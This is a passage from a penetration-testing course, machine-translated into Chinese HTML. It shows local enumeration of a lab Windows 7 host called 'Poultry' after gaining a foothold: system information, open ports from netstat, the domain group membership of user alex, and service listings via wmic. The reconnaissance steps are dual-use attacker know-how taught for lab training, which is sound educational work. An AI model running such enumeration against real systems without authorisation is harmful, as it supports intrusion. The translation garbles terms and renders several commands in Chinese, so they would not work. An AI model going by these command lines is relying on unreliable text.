<div style="position:absolute;top:222084;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机名：    </font></font></b></nobr></div>
<div style="position:absolute;top:222084;left:328"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">家禽</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:222101;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作系统名称：    </font></font></nobr></div>
<div style="position:absolute;top:222101;left:328"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">微软视窗 7 专业版</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:222118;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作系统版本：    </font></font></b></nobr></div>
<div style="position:absolute;top:222118;left:328"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.1.7601 服务包 1 内部版本 7601</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:222135;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:222152;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">注册业主：    </font></font></b></nobr></div>
<div style="position:absolute;top:222152;left:328"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">家禽管理员</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:222169;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:222186;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">领域：    </font></font></b></nobr></div>
<div style="position:absolute;top:222186;left:328"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">沙盒.local</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:222202;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">登录服务器：    </font></font></nobr></div>
<div style="position:absolute;top:222202;left:328"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\\沙盒DC </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:222331;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="188"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 188 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:222364;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:223441;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:223441;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:223441;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">805</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:222460;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">修补程序：    </font></font></nobr></div>
<div style="position:absolute;top:222460;left:328"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">已安装 186 个修补程序。</font></font></nobr></div>
<div style="position:absolute;top:222476;left:328"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[01]：KB2849697</font></font></nobr></div>
<div style="position:absolute;top:222493;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:222510;left:328"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[186]：KB4467107</font></font></nobr></div>
<div style="position:absolute;top:222528;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网卡：    </font></font></nobr></div>
<div style="position:absolute;top:222528;left:328"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">已安装 1 个 NIC。</font></font></nobr></div>
<div style="position:absolute;top:222544;left:328"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[01]：英特尔(R) PRO/1000 MT 网络连接</font></font></nobr></div>
<div style="position:absolute;top:222561;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:222578;left:376"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">IP 地址</font></font></nobr></div>
<div style="position:absolute;top:222595;left:376"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[01]：</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.5.5.20</font></font></font></b></nobr></div>
<div style="position:absolute;top:222612;left:376"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[02]：fe80::400a:ba3e:4ca5:6aa2</font></font></nobr></div>
<div style="position:absolute;top:222646;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\用户\亚历克斯&gt;</font></font></nobr></div>
<div style="position:absolute;top:222666;left:360"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 963 - 家禽系统信息</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:222695;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此命令的输出为我们提供了一些重要信息。</font><font style="vertical-align: inherit;">首先，我们知道操作</font></font></nobr></div>
<div style="position:absolute;top:222714;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统版本是Windows 7 Professional SP1 Build 7601。我们看到有一个本地用户叫</font></font></nobr></div>
<div style="position:absolute;top:222734;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“poultryadmin”并且这台计算机确实加入了“sandbox.local”域。</font><font style="vertical-align: inherit;">接下来，我们发现</font></font></nobr></div>
<div style="position:absolute;top:222753;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该主机上唯一的 ipv4 地址是 10.5.5.20。</font><font style="vertical-align: inherit;">由于我们无法进行完整的端口扫描，</font></font></nobr></div>
<div style="position:absolute;top:222772;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">netstat</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font><font style="vertical-align: inherit;">找出哪些端口是开放的</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:222807;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\alex&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">netstat -ano</font></font></font></b></nobr></div>
<div style="position:absolute;top:222841;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">活动连接</font></font></nobr></div>
<div style="position:absolute;top:222875;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">原始本地地址    </font></font></nobr></div>
<div style="position:absolute;top:222875;left:368"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">国外地址    </font></font></nobr></div>
<div style="position:absolute;top:222875;left:554"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">状态    </font></font></nobr></div>
<div style="position:absolute;top:222875;left:684"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PID</font></font></nobr></div>
<div style="position:absolute;top:222892;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TCP     </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.0.0.0:135</font></font></font></b></nobr></div>
<div style="position:absolute;top:222892;left:368"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.0.0.0:0    </font></font></nobr></div>
<div style="position:absolute;top:222892;left:554"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听力820</font></font></nobr></div>
<div style="position:absolute;top:222909;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TCP     </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.0.0.0:445</font></font></font></b></nobr></div>
<div style="position:absolute;top:222909;left:368"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.0.0.0:0    </font></font></nobr></div>
<div style="position:absolute;top:222909;left:554"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听力4</font></font></nobr></div>
<div style="position:absolute;top:222926;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TCP     </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.0.0.0:3389</font></font></font></b></nobr></div>
<div style="position:absolute;top:222926;left:368"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.0.0.0:0    </font></font></nobr></div>
<div style="position:absolute;top:222926;left:554"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听力 428</font></font></nobr></div>
<div style="position:absolute;top:222943;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TCP     </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.0.0.0:49152</font></font></font></b></nobr></div>
<div style="position:absolute;top:222943;left:368"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.0.0.0:0    </font></font></nobr></div>
<div style="position:absolute;top:222943;left:554"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听力 524</font></font></nobr></div>
<div style="position:absolute;top:222960;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TCP     </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.0.0.0:49153</font></font></font></b></nobr></div>
<div style="position:absolute;top:222960;left:368"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.0.0.0:0    </font></font></nobr></div>
<div style="position:absolute;top:222960;left:554"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听力 872</font></font></nobr></div>
<div style="position:absolute;top:222977;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TCP     </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.0.0.0:49154</font></font></font></b></nobr></div>
<div style="position:absolute;top:222977;left:368"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.0.0.0:0    </font></font></nobr></div>
<div style="position:absolute;top:222977;left:554"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">聆听 364</font></font></nobr></div>
<div style="position:absolute;top:222994;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TCP     </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.0.0.0:49172</font></font></font></b></nobr></div>
<div style="position:absolute;top:222994;left:368"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.0.0.0:0    </font></font></nobr></div>
<div style="position:absolute;top:222994;left:554"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听力 632</font></font></nobr></div>
<div style="position:absolute;top:223011;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TCP     </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.0.0.0:49173</font></font></font></b></nobr></div>
<div style="position:absolute;top:223011;left:368"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.0.0.0:0    </font></font></nobr></div>
<div style="position:absolute;top:223011;left:554"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听力 640</font></font></nobr></div>
<div style="position:absolute;top:223028;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TCP     </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.5.5.20:139</font></font></font></b></nobr></div>
<div style="position:absolute;top:223028;left:368"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.0.0.0:0    </font></font></nobr></div>
<div style="position:absolute;top:223028;left:554"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听力4</font></font></nobr></div>
<div style="position:absolute;top:223045;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:223062;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">UDP [fe80::400a:ba3e:4ca5:6aa2%11]:546 *:*</font></font></nobr></div>
<div style="position:absolute;top:223079;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">872</font></font></nobr></div>
<div style="position:absolute;top:223113;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\用户\亚历克斯&gt;</font></font></nobr></div>
<div style="position:absolute;top:223132;left:372"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 964 - 家禽上的 netstat</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:223161;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然我们之前的端口扫描只检查了前 20 个端口，但它仍然找到了所有感兴趣的端口</font></font></nobr></div>
<div style="position:absolute;top:223181;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">反正。</font><font style="vertical-align: inherit;">我们已经知道端口 135、139、445 和 3389 是开放的。</font><font style="vertical-align: inherit;">端口 49152 及以上</font></font></nobr></div>
<div style="position:absolute;top:223200;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是用于建立 TCP 连接的 Windows 默认动态/临时端口，我们不</font></font></nobr></div>
<div style="position:absolute;top:223219;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">需要担心他们。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">741</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此时，我们还应该检查 alex 是否属于任何管理员</font></font></nobr></div>
<div style="position:absolute;top:223239;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">组。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:223273;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\alex&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络用户/域亚历克斯</font></font></font></b></nobr></div>
<div style="position:absolute;top:223291;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该请求将在域 sandbox.local 的域控制器上进行处理。</font></font></nobr></div>
<div style="position:absolute;top:223325;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户名    </font></font></nobr></div>
<div style="position:absolute;top:223325;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">亚历克斯</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:223391;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">741 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Ephemeral_port</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:223519;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="189"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 189 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:223552;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:224629;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:224629;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:224629;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">806</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:223648;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">全名</font></font></nobr></div>
<div style="position:absolute;top:223664;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">评论</font></font></nobr></div>
<div style="position:absolute;top:223681;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户评论</font></font></nobr></div>
<div style="position:absolute;top:223698;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">国家代码    </font></font></nobr></div>
<div style="position:absolute;top:223698;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">000（系统默认）</font></font></nobr></div>
<div style="position:absolute;top:223716;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帐户有效    </font></font></nobr></div>
<div style="position:absolute;top:223716;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是的</font></font></nobr></div>
<div style="position:absolute;top:223732;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帐户过期    </font></font></nobr></div>
<div style="position:absolute;top:223732;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">绝不</font></font></nobr></div>
<div style="position:absolute;top:223766;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后设置的密码    </font></font></nobr></div>
<div style="position:absolute;top:223766;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11/12/2019 下午 4:26:47</font></font></nobr></div>
<div style="position:absolute;top:223783;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码过期    </font></font></nobr></div>
<div style="position:absolute;top:223783;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">绝不</font></font></nobr></div>
<div style="position:absolute;top:223800;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码可更改    </font></font></nobr></div>
<div style="position:absolute;top:223800;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11/13/2019 下午 4:26:47</font></font></nobr></div>
<div style="position:absolute;top:223817;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要求输入密码    </font></font></nobr></div>
<div style="position:absolute;top:223817;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是的</font></font></nobr></div>
<div style="position:absolute;top:223834;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户可以更改密码 是</font></font></nobr></div>
<div style="position:absolute;top:223868;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">允许使用工作站    </font></font></nobr></div>
<div style="position:absolute;top:223868;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">全部</font></font></nobr></div>
<div style="position:absolute;top:223885;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">登录脚本</font></font></nobr></div>
<div style="position:absolute;top:223902;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户资料</font></font></nobr></div>
<div style="position:absolute;top:223919;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主目录</font></font></nobr></div>
<div style="position:absolute;top:223936;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上次登录    </font></font></nobr></div>
<div style="position:absolute;top:223936;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2020/1/1 下午 1:58:06</font></font></nobr></div>
<div style="position:absolute;top:223970;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">允许登录时间    </font></font></nobr></div>
<div style="position:absolute;top:223970;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">全部</font></font></nobr></div>
<div style="position:absolute;top:224004;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">本地组成员资格</font></font></nobr></div>
<div style="position:absolute;top:224021;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">全局组成员 *</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域用户</font></font></font></b></nobr></div>
<div style="position:absolute;top:224038;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令成功完成。</font></font></nobr></div>
<div style="position:absolute;top:224057;left:368"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 965 - Poultry 上的网络用户</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:224087;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">似乎用户“alex”只是一个普通的域用户。</font><font style="vertical-align: inherit;">有了这些信息，我们</font></font></nobr></div>
<div style="position:absolute;top:224106;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将查看安装了哪些应用程序。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:224707;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="190"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 190 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:224740;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:225817;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:225817;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:225817;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">807</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:225383;left:341"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 344：查找已安装的应用程序</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:225414;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows 不会为“开始”菜单中列出的此用户显示很多应用程序。</font><font style="vertical-align: inherit;">虽然这</font></font></nobr></div>
<div style="position:absolute;top:225433;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不是一个完整的列表，它让我们很好地了解这台计算机的用途。</font><font style="vertical-align: inherit;">根据信息</font></font></nobr></div>
<div style="position:absolute;top:225453;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到目前为止，这可能是用户的工作站。</font></font></nobr></div>
<div style="position:absolute;top:225486;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们可以查看服务，看看是否有任何有趣的东西在这个盒子上运行。</font><font style="vertical-align: inherit;">我们可以</font></font></nobr></div>
<div style="position:absolute;top:225505;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wmic</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令列出所有正在运行的服务。</font><font style="vertical-align: inherit;">我们现在只想要基本信息，比如</font></font></nobr></div>
<div style="position:absolute;top:225524;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称、显示名称、路径名和启动模式。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:225559;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\alex&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wmic 服务获取名称、显示名称、路径名、启动模式</font></font></font></b></nobr></div>
<div style="position:absolute;top:225593;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示名称    </font></font></nobr></div>
<div style="position:absolute;top:225593;left:562"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称</font></font></nobr></div>
<div style="position:absolute;top:225610;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">路径名</font></font></nobr></div>
<div style="position:absolute;top:225661;left:554"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启动模式</font></font></nobr></div>
<div style="position:absolute;top:225678;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:225695;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows Driver Foundation - 用户模式驱动程序框架 wudfsvc</font></font></nobr></div>
<div style="position:absolute;top:225712;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted</font></font></nobr></div>
<div style="position:absolute;top:225763;left:554"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">手动的 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:225895;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="191"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 191 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:225928;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:227005;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:227005;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:227005;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">808</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:226024;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WWAN 自动配置    </font></font></nobr></div>
<div style="position:absolute;top:226024;left:562"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">万维网</font></font></nobr></div>
<div style="position:absolute;top:226040;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork</font></font></nobr></div>
<div style="position:absolute;top:226092;left:554"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">手动的</font></font></nobr></div>
<div style="position:absolute;top:226111;left:349"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 966 - 通过 wmic 获取服务</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:226140;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这是很好的信息，但我们手动查看的信息太多了。</font><font style="vertical-align: inherit;">我们将缩小</font></font></nobr></div>
<div style="position:absolute;top:226160;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它归结为通过将</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wmic</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令传送到</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">findstr</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来</font><font style="vertical-align: inherit;">自动启动的服务</font></font></nobr></div>
<div style="position:absolute;top:226179;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对于“自动”这个词。</font><font style="vertical-align: inherit;">我们还包括</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/i</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志以使搜索不区分大小写。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
